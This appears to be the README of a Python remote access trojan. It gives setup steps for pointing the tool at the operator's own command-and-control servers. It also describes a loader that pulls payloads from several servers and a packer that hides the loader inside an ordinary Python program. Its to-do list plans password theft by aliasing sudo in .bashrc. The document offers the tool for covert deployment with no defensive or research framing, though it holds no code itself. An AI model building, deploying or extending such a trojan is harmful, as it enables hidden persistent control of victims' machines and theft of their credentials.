# RAT
## Dependencies
- python3
- Systemd (for persistency)
- websockets (tries to pip install on launch)
## Usage
1) Change `state['servers']` in `rat.py` to your c2 servers
2) Either deploy on your own or use `packer.py` and `loader.py`

# Loader
- Loader attempts to download multiple payloads from multiple servers
- Change `URLS` in `loader.py` in the this format: `[['server1/payload1','server4/payload1'],['server3/payload2','server4/payload2']]`

# Packer
- Packs the loader to be hidden in a python program


# TODOs?
- Asymmetric Encryption
- Rewrite in a compiled language or remove the need to install websockets
- Steal password by aliasing sudo in .bashrc -> escalation?
- Modules